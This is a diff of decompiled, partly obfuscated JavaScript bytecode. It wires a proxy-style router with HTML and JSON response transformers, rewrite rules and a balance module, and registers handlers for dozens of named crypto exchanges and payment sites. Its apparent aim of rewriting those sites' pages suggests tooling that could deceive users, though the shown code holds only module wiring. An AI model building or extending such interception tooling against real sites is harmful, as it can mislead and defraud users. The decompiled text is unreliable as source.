9650, "Vh": "9hYk", "VY": 110977, "VD": "A0Dr", "Vl": 38588, "Va": "A5nh", "J0": 54424, "J2": 85078, "J3": 66967, "J4": 11546, "J5": 79340, "J6": 1590, "J7": "8dGo", "J9": 12705, "Jd": "*!!t", "Jg": 123274, "JL": "F1xf", "JX": 11249, "Jc": ")Lyh", "Jx": 82643, "JB": "n@A0", "Ju": 76845, "Js": "iSZ6", "Jb": 87246, "Ji": 46737, "Jw": "93y[", "Jf": 63712, "Jt": "9hYk", "JP": 69403, "Jp": "p8sI", "JR": 782, "JQ": 14397, "JW": "%]hf", "JT": 72197, "JG": "epz[", "Jy": 109771, "JU": 15504, "JF": 18189, "Jq": "[()[", "JO": 11017, "Jm": "9pb7", "JC": 15556, "Jn": 933, "Jr": 75418, "Jh": "pdVE", "JY": 97464, "JD": "p[w*", "Jl": 43097, "z0": "n@A0", "z1": 99182, "z2": 63219, "z3": "gm42", "z6": 98568, "zV": "p[w*", "zJ": 90818, "zz": 96191, "zd": 107349, "zS": 6270, "zg": 91864, "zL": 50086, "zX": "L@kv", "zE": 50009, "zc": "XR6@", "zx": 10008, "zB": "n@A0", "zu": 44879, "zA": "^Ceg", "zs": 8682, "zw": 120329, "zf": "8dGo", "zt": 100703, "zP": "C0qY", "zp": 108924, "zo": 105038, "zW": 88754, "zG": "toM2", "zy": 4416, "zU": 112139, "zF": 35493, "zO": 68985, "zC": "]1@2", "zZ": 92275, "zn": "[Jy3", "zr": 25083, "zH": 81569, "zh": "h^gm", "zY": 118750, "zl": 81917, "za": "A0Dr", "d2": 88469, "d3": "93y[", "d4": 72710, "d5": "mwAz", "d6": 72699, "d7": "8dGo", "d9": 85969, "dV": "x&b0", "dJ": 105779, "dz": "O9*f", "dd": 86533, "dg": 114405, "dL": "h^gm", "dX": 88454, "dj": "pdVE", "dE": 32522, "dc": "[Jy3", "dx": 38322, "dB": 122677, "dK": "[()[", "dA": 51499, "ds": 76161, "di": 69112, "dw": 120869, "df": "p8sI", "dt": 20565, "dP": "%r7r", "dI": 122444, "dp": 85869, "dv": "L@kv", "dN": 27495, "dM": "toM2", "dQ": 96845, "dW": 41901, "dy": "^Ceg", "de": 32643, "dU": 7562, "dO": 80371, "dC": 7827, "dZ": 84962, "dn": 70980, "dr": "VHeU", "dH": 96845, "dY": "n@A0", "dD": 59231, "dl": "p[w*", "da": 71671, "S0": 100700, "S2": "BS4&", "S3": 78971, "S4": 109383, "S5": "Yx9u", "S6": 3317, "S7": 22578, "SV": "I@Bf", "SJ": 33730, "Sz": 123233, "Sd": 6841, "Sg": 110921, "SX": "F1xf", "Sj": 62278, "SE": 28409, "Sc": "xQ)2", "Sx": 90030, "SB": 49630, "SK": "kh^v", "SA": 72003, "Ss": 45250, "Sb": 74135, "Si": "BS4&", "Sw": 5743, "Sf": "BS4&", "St": 88902, "SP": "93y[", "Sp": 28409, "SR": 83405, "Sv": "O9*f", "SN": "XR6@", "SM": 25890, "Sk": 14636, "SW": "b48I", "ST": 97023, "Se": 50863, "SU": 52886, "SF": ")Ku4", "Sq": 15479, "SO": 54945, "Sm": 11032, "SZ": "m[K#", "SH": 18099, "SY": "h^gm", "Sl": 74084, "g1": 106675, "g2": "gm42", "g4": 44263, "g5": 104022, "g6": "p[w*", "g7": 52870, "g8": 62278, "gV": 82841, "gz": "Yx9u", "gd": 10780, "gg": 21197, "gX": 109973, "gj": "*!!t", "gE": 18099, "gc": "h^gm", "gx": 8539, "gB": 6673, "gK": 18099, "gu": "h^gm", "gs": 86694, "gb": 67789, "gw": 9683, "gt": "K&pk", "gP": 93385, "gp": 35524, "go": 42021, "gR": "]C&)", "gv": 90758, "gN": "C0qY", "gk": 43590, "BKQ": 69874, "BKW": 116082, "BKT": 37462, "BKG": 32626, "BKy": 107243, "BKU": 48178, "BKF": 91238, "BKq": "iSZ6", "BKO": 93385, "BKm": "p[w*", "BKC": 91980, "BKZ": "iSZ6", "BKn": 54945, "BKr": "m[K#", "BKH": "*!!t", "BKh": 41986, "BKY": "89J2", "BKD": 40589, "BKl": "]1@2", "BKa": 117687, "Bu0": "m[K#", "Bu1": 101872, "Bu2": 109973, "Bu3": "*!!t", "Bu4": 37462, "Bu5": 60848, "Bu6": ")Lyh", "Bu7": 36205, "Bu8": 24243, "Bu9": "]1@2", "BuV": 20508, "BuJ": "%r7r", "Buz": 72003, "Bud": 45250, "BuS": 44263, "Bug": "BS4&", "BuL": 72769, "BuX": "JrBU", "Buj": 11032, "BuE": "m[K#", "Buc": 117767, "Bux": "I@Bf", "BuB": 58567, "BuK": 49446, "Buu": "89J2", "BuA": 67789, "Bus": "iSZ6", "Bub": 36201, "Bui": "M2Ty", "Buw": 46392, "Buf": "pdVE", "But": "p[w*", "BuP": 92923, "BuI": 3137, "Bup": 85687, "Buo": 103496, "BuR": 108755, "Buv": "%r7r", "BuN": 33830, "BuM": 34654, "Buk": 75567, "BuQ": "gm42", "BuW": 44263, "BuT": "BS4&", "BuG": 23953, "Buy": 84298, "Bue": "xQ)2", "BuU": 93449, "BuF": "9pb7", "Buq": 52886, "BuO": 36974, "Bum": "p8sI", "BuC": 68030, "BuZ": "nvO5", "Bun": 85687, "Bur": "]C&)", "BuH": "L@kv", "Buh": 73022, "BuY": 82596, "BuD": "93y[", "Bul": 36205, "Bua": 118627, "BA0": "p8sI", "BA1": 66420, "BA2": "L@kv", "BA3": 42021, "BA4": "]C&)", "BA5": 120107, "BA6": 10495, "BA7": "A5nh", "BA8": 29106, "BA9": 113613, "BAV": 65487, "BAJ": 29106, "BAz": "9pb7", "BAd": 73022, "BAS": "toM2", "BAg": 52843, "BAL": "]C&)", "BAX": 88902, "BAj": "]C&)", "BAE": 18538, "BAc": "YbH*", "BAx": "JrBU", "BAB": 56915, "BAK": 111488, "BAu": 119632, "BAA": 95068, "BAs": "YbH*", "BAb": 58567, "BAi": 6696, "BAw": 63040, "BAf": "x&b0", "BAt": 90758, "BAP": "C0qY", "BAI": 90384, "BAp": "[()[", "BAo": "K&pk", "BAR": "p[w*", "BAv": 82382, "BAN": "p[w*", "BAM": 78630, "BAk": "9pb7", "BAQ": 82742, "BAW": 85827, "BAT": "pdVE", "BAG": 30364, "BAy": "p[w*", "BAe": 93449, "BAU": "[Jy3", "BAF": 4481, "BAq": "mwAz", "BAO": 34654, "BAm": "VHeU", "BAC": 8539, "BAZ": "A5nh", "BAn": 36205, "BAr": "%r7r", "BAH": 23953, "BAh": 35235, "BAY": 22578, "BAD": "I@Bf", "BAl": 60848, "BAa": "p[w*", "Bs0": "]C&)", "Bs1": 86694, "Bs2": "O9*f", "Bs3": "YbH*", "Bs4": "b48I", "Bs5": 78630, "Bs6": 48961, "Bs7": "A5nh", "Bs8": 58785, "Bs9": "gm42", "BsV": 95068, "BsJ": 49630, "Bsz": "xQ)2"}
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__createBinding"]
+	}
+	if (!ACCU)
+	{
+		ACCU = Object["create"]
+		if (Object["create"])
+		{
+			ACCU = func_defineExportProperty_0x10000bd92
+		}
+		else
+		{
+			ACCU = func_copyProperty_0x10000bd94
+		}
+	}
+	Scope[1176][11] = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__setModuleDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = Object["create"]
+		if (Object["create"])
+		{
+			ACCU = func_defineDefaultExport_0x10000bd96
+		}
+		else
+		{
+			ACCU = func_setDefaultExport_0x10000bd98
+		}
+	}
+	Scope[1176][12] = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importStar"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_initializeInteropModule_0x10000bda1()
+	}
+	r1 = ACCU
+	r62 = Object["defineProperty"]
+	r65 = "__esModule"
+	r66 = new {"value": <true}
+	ACCU = r62(a0, r65, r66)
+	a0["router"] = undefined
+	r2 = func_initializeRouterBridgeModule_0x10000ba61["exports"]()
+	r65 = func_initAscendexRouterModule_0x10000ba83["exports"]()
+	r3 = r1(r65)
+	r65 = func_initPriceIndexerRouter_0x10000ba92["exports"]()
+	r4 = r1(r65)
+	r65 = func_initBinanceRouter_0x10000bac3["exports"]()
+	r5 = r1(r65)
+	r65 = func_initBinanceThRouter_0x10000bad8["exports"]()
+	r6 = r1(r65)
+	r65 = func_initBingxRouter_0x10000bae1["exports"]()
+	r7 = r1(r65)
+	r65 = func_initBitgetRouter_0x10000baeb["exports"]()
+	r8 = r1(r65)
+	r65 = func_initBitkubRouter_0x10000baf7["exports"]()
+	r9 = r1(r65)
+	r65 = func_initBitmartRouter_0x10000bb01["exports"]()
+	r10 = r1(r65)
+	r65 = func_initBitrueRouter_0x10000bb0b["exports"]()
+	r11 = r1(r65)
+	r65 = func_initBitunixRouter_0x10000bb15["exports"]()
+	r12 = r1(r65)
+	r65 = func_initBybitRouter_0x10000bb1e["exports"]()
+	r13 = r1(r65)
+	r65 = func_initCoinexRouter_0x10000bb27["exports"]()
+	r14 = r1(r65)
+	r65 = func_initCoinhubRouter_0x10000bb31["exports"]()
+	r15 = r1(r65)
+	r65 = func_initializeCoinsphRouterModule_0x10000bb3d["exports"]()
+	r16 = r1(r65)
+	r65 = func_initializeCoinwRouterModule_0x10000bb45["exports"]()
+	r17 = r1(r65)
+	r65 = func_initializeDecryptoRouterModule_0x10000bb4d["exports"]()
+	r18 = r1(r65)
+	r65 = func_initializeDeepcoinRouterModule_0x10000bb57["exports"]()
+	r19 = r1(r65)
+	r65 = func_initializeDigifinexRouterModule_0x10000bb63["exports"]()
+	r20 = r1(r65)
+	r65 = func_initBalanceModule_0x10000bb85["exports"]()
+	r21 = r1(r65)
+	r65 = func_initializeFmcpayRouterModule_0x10000bb8e["exports"]()
+	r22 = r1(r65)
+	r65 = func_initializeGateioRouterModule_0x10000bb98["exports"]()
+	r23 = r1(r65)
+	r65 = func_initializeHataRouterModule_0x10000bba3["exports"]()
+	r24 = r1(r65)
+	r65 = func_initializeHtxRouterModule_0x10000bbad["exports"]()
+	r25 = r1(r65)
+	r65 = func_initializeI3qRouterModule_0x10000bbb5["exports"]()
+	r26 = r1(r65)
+	r65 = func_initializeBinanceTrRouterModule_0x10000bbbe["exports"]()
+	r27 = r1(r65)
+	r65 = func_initializeBitazzaRouterModule_0x10000bbc8["exports"]()
+	r28 = r1(r65)
+	r65 = func_initializeBitstreetxRouterModule_0x10000bbd2["exports"]()
+	r29 = r1(r65)
+	r65 = func_initCexIoModule_0x10000bc0b["exports"]()
+	r30 = r1(r65)
+	r65 = func_initCsgoempireRouter_0x10000bc14["exports"]()
+	r31 = r1(r65)
+	r65 = func_initFortunoRouter_0x10000bc1d["exports"]()
+	r32 = r1(r65)
+	r65 = func_initGoonusRouter_0x10000bc2b["exports"]()
+	r33 = r1(r65)
+	r65 = func_initKcexRouter_0x10000bc34["exports"]()
+	r34 = r1(r65)
+	r65 = func_initKrakenRouter_0x10000bc3e["exports"]()
+	r35 = r1(r65)
+	r65 = func_initKucoinRouter_0x10000bc46["exports"]()
+	r36 = r1(r65)
+	r65 = func_initLazzaglobalRouter_0x10000bc4f["exports"]()
+	r37 = r1(r65)
+	r65 = func_initLbankRouter_0x10000bc57["exports"]()
+	r38 = r1(r65)
+	r65 = func_initMexcRouter_0x10000bc60["exports"]()
+	r39 = r1(r65)
+	r65 = func_initNexoRouter_0x10000bc6a["exports"]()
+	r40 = r1(r65)
+	r65 = func_initNoonesRouter_0x10000bc73["exports"]()
+	r41 = r1(r65)
+	r65 = func_initOkxRouter_0x10000bc80["exports"]()
+	r42 = r1(r65)
+	r65 = func_initOslRouter_0x10000bc8b["exports"]()
+	r43 = r1(r65)
+	r65 = func_initPaxfulRouter_0x10000bc99["exports"]()
+	r44 = r1(r65)
+	r65 = func_initPdaxRouter_0x10000bcaa["exports"]()
+	r45 = r1(r65)
+	r65 = func_initPionexModule_0x10000bcb2["exports"]()
+	r46 = r1(r65)
+	r65 = func_initPoloniexModule_0x10000bcbb["exports"]()
+	r47 = r1(r65)
+	r65 = func_initRemitanoModule_0x10000bccd["exports"]()
+	r48 = r1(r65)
+	r65 = func_initRipioModule_0x10000bcd6["exports"]()
+	r49 = r1(r65)
+	r65 = func_initSkrillModule_0x10000bcde["exports"]()
+	r50 = r1(r65)
+	r65 = func_initializeStakeRouterModule_0x10000bcf8["exports"]()
+	r51 = r1(r65)
+	r65 = func_initStormgainModule_0x10000bd00["exports"]()
+	r52 = r1(r65)
+	r65 = func_initSuperexModule_0x10000bd0a["exports"]()
+	r53 = r1(r65)
+	r65 = func_initTdPplgmModule_0x10000bd13["exports"]()
+	r54 = r1(r65)
+	r65 = func_initTokocryptoModule_0x10000bd1e["exports"]()
+	r55 = r1(r65)
+	r65 = func_initTtxVipModule_0x10000bd26["exports"]()
+	r56 = r1(r65)
+	r65 = func_initUbitexModule_0x10000bd2e["exports"]()
+	r57 = r1(r65)
+	r65 = func_initWeltradeModule_0x10000bd39["exports"]()
+	r58 = r1(r65)
+	r65 = func_initXtModule_0x10000bd43["exports"]()
+	r59 = r1(r65)
+	r65 = func_initZaifModule_0x10000bd4d["exports"]()
+	r60 = r1(r65)
+	r64 = r2["Router"]
+	a0["router"] = r64(r0)
+	r62 = a0["router"]["use"]
+	ACCU = r62(r5["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r13["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r35["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r36["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r42["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r39["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r7["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r8["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r47["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r11["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r20["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r23["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r9["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r40["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r6["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r21["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r25["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r12["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r50["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r45["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r10["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r3["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r41["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r51["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r4["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r14["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r15["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r16["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r19["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r17["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r18["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r22["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r26["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r34["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r37["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r38["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r46["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r52["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r53["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r57["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r59["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r24["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r44["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r55["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r48["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r30["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r60["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r28["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r58["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r31["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r27["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r56["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r43["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r29["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r33["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r54["default"])
+	r62 = a0["router"]["use"]
+	ACCU = r62(r32["default"])
+	r63 = a0["router"]
+	r62 = r63["use"]
+	ACCU = r62(r49["default"])
+	return undefined
+}
+function func_initializeHtmlTransformerModule_0x10000bc01(a0)
+{
+	Scope[1260][18] = func_p_0x10000bbd3
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__createBinding"]
+	}
+	if (!ACCU)
+	{
+		ACCU = Object["create"]
+		if (Object["create"])
+		{
+			ACCU = func_defineBindingProperty_0x10000bbe6
+		}
+		else
+		{
+			ACCU = func_copyProperty_0x10000bbe8
+		}
+	}
+	Scope[1260][16] = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__setModuleDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = Object["create"]
+		if (Object["create"])
+		{
+			ACCU = func_defineDefaultProperty_0x10000bbea
+		}
+		else
+		{
+			ACCU = func_setDefaultProperty_0x10000bbec
+		}
+	}
+	Scope[1260][17] = ACCU
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importStar"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_initializeInteropModule_0x10000bc00()
+	}
+	r1 = ACCU
+	r4 = Object["defineProperty"]
+	r7 = "__esModule"
+	r8 = new {"value": <true}
+	ACCU = r4(a0, r7, r8)
+	a0["htmlTransformer"] = func_createScopedHandler_0x10000bbd8
+	r7 = func_initializeCheerioBundle_0x100002834["exports"]()
+	Scope[1260][19] = r1(r7)
+	return undefined
+}
+function func_initJsonTransformerModule_0x10000ba7b(a0)
+{
+	Scope[1355][5] = func_n_0x10000ba73
+	Scope[1355][6] = func_parseJsonBuffer_0x10000ba78
+	r3 = Object["defineProperty"]
+	r6 = "__esModule"
+	r7 = new {"value": <true}
+	ACCU = r3(a0, r6, r7)
+	a0["jsonTransformer"] = func_createContextHandler_0x10000ba76
+	return undefined
+}
+function func_initModule_0x10000ba72(a0)
+{
+	r5 = Object["defineProperty"]
+	r8 = "__esModule"
+	r9 = new {"value": <true}
+	ACCU = r5(a0, r8, r9)
+	a0["setHooks"] = func_assignScopeProperties_0x10000ba71
+	Scope[1360][3] = {}
+	a0["default"] = Scope[1360][3]
+	return undefined
+}
+function func_initializeRouter_0x10000ba6f()
+{
+	r0 = new {"V": "h^gm", "J": 88426, "S": "pdVE", "g": 111785, "L": "Yx9u", "X": 53288}
+	r7 = func_initializeRouterBridgeModule_0x10000ba61["exports"]()
+	global_eL = func_interopRequireWildcard_0x10000317a(r7)
+	global_ll = global_eL["Router"](r0)
+	return undefined
+}
+function func_initializeRouterBridgeModule_0x10000ba61(a0)
+{
+	Scope[1364][7] = func_s_0x10000ba56
+	r3 = 0
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interopRequireDefaultAlt2_0x10000ba5c
+	}
+	r5 = ACCU
+	r8 = Object["defineProperty"]
+	r11 = "__esModule"
+	r12 = new {"value": <true}
+	ACCU = r8(a0, r11, r12)
+	r9 = "Router"
+	r11 = "listen"
+	r14 = undefined
+	a0["bridge"] = undefined
+	a0[r11] = r14
+	a0[r9] = r14
+	r11 = func_initializeRouterModule_0x10000b99c["exports"]()
+	r4 = r5(r11)
+	a0["Router"] = r4["default"]
+	Scope[1364][8] = func_initializeBridgeModule_0x10000ba4b["exports"]()
+	r8 = Object["defineProperty"]
+	r11 = "bridge"
+	r12 = new {"enumerable": <true, "get": null}
+	r12["get"] = func_getBridge_0x10000ba60
+	ACCU = r8(a0, r11, r12)
+	Scope[1364][9] = func_initializeListenerModule_0x10000ba55["exports"]()
+	r8 = Object["defineProperty"]
+	r11 = "listen"
+	r12 = new {"enumerable": <true, "get": null}
+	r12["get"] = func_getListener_0x10000ba5e
+	ACCU = r8(a0, r11, r12)
+	return undefined
+}
+function func_getBridge_0x10000ba60()
+{
+	return Scope[1364][8]["bridge"]
+}
+function func_getListener_0x10000ba5e()
+{
+	return Scope[1364][9]["listen"]
+}
+function func_interopRequireDefaultAlt2_0x10000ba5c(a0)
+{
+	if (a0)
+	ACCU = a0["__esModule"]
+		&& (a0["__esModule"])
+	{
+		ACCU = a0
+	}
+	else
+	{
+		r2 = new {"default": null}
+		r2["default"] = a0
+		ACCU = r2
+	}
+	return ACCU
+}
+function func_initializeListenerModule_0x10000ba55(a0)
+{
+	Scope[1367][6] = func_s_0x10000ba4e
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interopRequireDefaultAlt_0x10000ba54
+	}
+	r2 = ACCU
+	r5 = Object["defineProperty"]
+	r8 = "__esModule"
+	r9 = new {"value": <true}
+	ACCU = r5(a0, r8, r9)
+	a0["listen"] = func_startListener_0x10000ba50
+	r8 = func_defineEsModule_0x10000ba4d["exports"]()
+	Scope[1367][7] = r2(r8)
+	return undefined
+}
+function func_initializeBridgeModule_0x10000ba4b(a0)
+{
+	Scope[1370][22] = func_getFunctionOrDefault_0x10000b9d2
+	Scope[1370][23] = func_getResponseType_0x10000b9d4
+	Scope[1370][24] = func_normalizeBody_0x10000b9d6
+	Scope[1370][25] = func_toBuffer_0x10000b9d8
+	Scope[1370][26] = func_setDiffBuffer_0x10000b9df
+	Scope[1370][27] = func_F_0x10000b9e0
+	ACCU = a0
+	if (a0)
+	{
+		ACCU = a0["__importDefault"]
+	}
+	if (!ACCU)
+	{
+		ACCU = func_interopRequireDefault_0x10000ba4a
+	}
+	r1 = ACCU
+	r4 = Object["defineProperty"]
+	r7 = "__esModule"
+	r8 = new {"value": <true}
+	ACCU = r4(a0, r7, r8)
+	a0["bridge"] = func_createProxyHooks_0x10000ba36
+	r7 = func_initializeHeadersModule_0x10000b9ad["exports"]()
+	Scope[1370][20] = r1(r7)
+	r7 = func_initializeHeadersModule_0x10000b9cf["exports"]()
+	Scope[1370][21] = r1(r7)
+	return undefined
+}
+function func_initializeRouterModule_0x10000b99c(a0)
+{
+	Scope[1426][47] = func_K_0x10000b93c
+	Scope[1426][50] = func_splitAtIndex_0x10000b93e
+	r0 = new {"V": "93y[", "J": 45814, "S": "K&pk", "g": 96341, "L": "O9*f", "X": 26205, "j": "kh^v", "E": 119356, "c": "p[w*", "x": 112953, "K": "JrBU", "u": 59103, "A": "]C&)", "s": 25943, "b": "toM2", "i": 96665, "w": "B@Sb", "f": 19219, "t": "XR6@", "P": 39718, "I": 32350, "p": "kh^v", "o": 54616, "R": "kh^v", "v": 118671, "N": "]1@2", "M": 115817, "k": "I@Bf", "Q": 85222, "W": "x&b0", "T": 88630, "G": 123872, "y": "C0qY", "e": 12788, "U": "b48I", "q": 102213, "O": "C0qY", "C": 89360, "n": "[Jy3", "r": 29609, "H": 90601, "h": "I@Bf", "Y": 52674, "D": "xQ)2", "l": 51643, "a": "eeST", "V0": 28879, "V1": "vV[N", "V2": 21585, "V3": "h^gm", "V6": 11644, "VV": "^Ceg", "VJ": 44863, "Vz": 16703, "Vd": 6507, "Vg": 69567, "VL": "M2Ty", "Vc": 109091, "Vx": "h98j", "VB": 98244, "VK": 122724, "Vu": "C0qY", "VA": 96942, "Vs": "Yx9u", "Vb": 110601, "Vw": 46972, "Vf": "n@A0", "Vt": 76637, "VP": "b48I", "Vp": 424, "Vo": 20315, "VR": "JrBU", "VQ": 90259, "VW": "b48I", "VT": 89365, "VG": "toM2", "Vy": 3866, "Ve": "9pb7", "VU": 13739, "Vq": "M2Ty", "VO": 21290, "Vm": "gm42", "VZ": 4066, "Vn": "xQ)2", "Vr": 32748, "VH": "iSZ6", "Vh": 86295, "VY": "*!!t", "VD": 43256, "Vl": 82151, "Va": "8dGo", "J0": 36413, "J2": "F1xf", "J3": 13385, "J4": "A5nh", "J5": 16485, "J6": "eeST", "J7": 38060, "J9": 63557, "Jd": 54865, "Jg": 110721, "JL": 23467, "JX": "YbH*", "Jc": 100649, "Jx": "A0Dr", "JB": 53516, "Ju": "[Jy3", "Js": 42652, "Jb": "VHeU", "Ji": 63014, "Jw": 24597, "Jf": "A0Dr", "Jt": 106187, "JP": "JrBU", "Jp": 65380, "JR": "gm42", "JQ": 33355, "JW": "L@kv", "JT": 4662, "JG": "XR6@", "Jy": 70725, "JU": 93799, "JF": 69372, "Jq": 109543, "JO": "89J2", "Jm": 8518, "JC": 100059, "Jn": 102053, "Jr": "9hYk", "Jh": 37318, "JY": "p[w*", "JD": 101930, "Jl": "^Ceg", "z0": 45511}
+	r3 = Object["defineProperty"]
+	r6 = "__esModule"
+	r7 = new {"value": <true}
+	ACCU = r3(a0, r6, r7)
+	Scope[1426][48] = func_initGlobFilterModule_0x10000b890["exports"]()
+	Scope[1426][49] = func_initPathToRegexpModule_0x10000b93b["exports"]()
+	ACCU = ToName("once")
+	ACCU = ToName("rewrite")
+	ACCU = ToName("createChild")
+	ACCU = ToName("removeChild")
+	ACCU = ToName("use")
+	ACCU = ToName("remove")
+	ACCU = ToName("handleRequest")
+	ACCU = ToName("getRoute")
+	ACCU = ToName("setTerminator")
+	ACCU = ToName("get")
+	ACCU = ToName("post")
+	ACCU = ToName("put")
+	ACCU = ToName("patch")
+	ACCU = ToName("delete")
+	ACCU = ToName("terminate")
+	ACCU = ToName("addRoute")
+	ACCU = ToName("routes")
+	ACCU = ToName("rewrites")
+	ACCU = ToName("terminator")
+	ACCU = ToName("getRewrite")
+	ACCU = ToName("createMatcher")
+	if (func_K_0x10000b93c === "prototype")
+	{
+		ACCU = ThrowStaticPrototypeError(r0)
+	}
+	ACCU = ToName("createSessionMatcher")
+	if (func_K_0x10000b93c === "prototype")
+	{
+		ACCU = ThrowStaticPrototypeError(r0)
+	}
+	ACCU = ToName("createHostMatcher")
+	if (func_K_0x10000b93c === "prototype")
+	{
+		ACCU = ThrowStaticPrototypeError(r0)
+	}
+	ACCU = ToName("createWildcardMatcher")
+	if (func_K_0x10000b93c === "prototype")
+	{
+		ACCU = ThrowStaticPrototypeError(r0)
+	}
+	ACCU = ToName("createPathMatcher")
+	if (func_K_0x10000b93c === "prototype")
+	{
+		ACCU = ThrowStaticPrototypeError(r0)
+	}
+	ACCU = ToName("advancedPathMatcher")
+	if (func_K_0x10000b93c === "prototype")
+	{
+		ACCU = ThrowStaticPrototypeError(r0)
+	}
+	r5 = DefineClass([56, <NameDictionary[101], <NumberDictionary[52], [176, 184, 192, 200, 208, 216], <NameDictionary[197], <NumberDictionary[100], [16, 24, 32, 40, 48, 56, 64, 72, 80, 88, 96, 104, 112, 120, 128, 136, 145, 153, 161, 168]], func_initRouteBuilder_0x10000b94e, null, func_onRoute_0x10000b950, 29609, func_addOnceRoute_0x10000b952, "xQ)2", func_addRewrite_0x10000b954, "eeST", func_addRouteBuilder_0x10000b956, func_K_0x10000b93c, func_removeChild_0x10000b958, func_K_0x10000b93c, func_addChild_0x10000b95a, "K&pk", func_detach_0x10000b95c, "b48I", func_getHostInfo_0x10000b95f, func_K_0x10000b93c, func_matchRequest_0x10000b963, func_K_0x10000b93c, func_setTerminator_0x10000b965, func_K_0x10000b93c, func_onGet_0x10000b967, "p[w*", func_onPost_0x10000b969, "JrBU", func_onPut_0x10000b96b, "b48I", func_onPatch_0x10000b96d, "toM2", func_onDelete_0x10000b96f, "9pb7", func_applySession_0x10000b971, func_K_0x10000b93c, func_addRoute_0x10000b976, func_K_0x10000b93c, func_getRoutes_0x10000b979, "*!!t", func_getRewrites_0x10000b97c, func_K_0x10000b93c, func_getTerminator_0x10000b97e, func_K_0x10000b93c, func_getRewrite_0x10000b981, func_K_0x10000b93c, func_createHostMatcher_0x10000b985, func_K_0x10000b93c, func_createMatcher_0x10000b98a, func_K_0x10000b93c, func_createHostMatcher_0x10000b98c, func_K_0x10000b93c, func_createWildcardMatcher_0x10000b991, func_K_0x10000b93c, func_createPathMatcher_0x10000b995, func_K_0x10000b93c, func_advancedPathMatcher_0x10000b99b)
+	Scope[1427][2] = func_initRouteBuilder_0x10000b94e
+	a0["default"] = func_initRouteBuilder_0x10000b94e
+	return undefined
+}
+function func_initializeNetworkAndCore_0x10000a949()
+{
+	ACCU = func_initializeNetworkClient_0x100006702()
+	ACCU = func_initializeCoreModule_0x10000a945()
+	return undefined
+}
+function func_initializeCoreModule_0x10000a945()
+{
+	r3 = 0
+	ACCU = func_initializeCacheClient_0x10000a917()
+	ACCU = func_initModule_0x10000a91a()
+	ACCU = func_initMjModule_0x10000a93b()
+	ACCU = func_noopHandler_0x10000673e()
+	ACCU = func_unknown_0x10000590f()
+	r11 = (1 / 0)
+	r8 = r1
+	global_hl = func_initializeQueueScope_0x1000005b2(func_diffAndMergeSingle_0x1000005b8, r11, 1)
+	r11 = (1 / 0)
+	r8 = r1
